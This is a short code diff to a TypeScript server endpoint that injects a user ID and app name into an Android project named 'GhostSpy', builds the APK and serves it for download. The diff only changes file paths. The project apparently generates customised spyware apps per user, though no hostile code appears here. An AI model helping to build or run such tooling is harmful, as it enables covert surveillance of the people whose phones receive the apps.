@@ -27,7 +27,7 @@ export const createNewApk = async (req: Request, res: Response) => {
 		// Step 1: Replace the userId and appName in the strings.xml file
 		const filePath = path.join(
 			__dirname,
-			"../../public/GhostSpy/app/src/main/res/values/strings.xml"
+			"../../public/GhostSpy/GhostSpy_main/app/src/main/res/values/strings.xml"
 		);
 		const fileContent = await fs.promises.readFile(filePath, "utf8");
 
@@ -111,7 +111,7 @@ export const createNewApk = async (req: Request, res: Response) => {
 				// Step 4: Make the APK available for download
 				const apkPath = path.join(
 					__dirname,
-					"../../public/GhostSpy/app/build/outputs/apk/debug/app-debug.apk"
+					"../../public/GhostSpy/GhostSpy_main/app/build/outputs/apk/debug/app-debug.apk"
 				);
 
 				const fileExists = await fs.promises
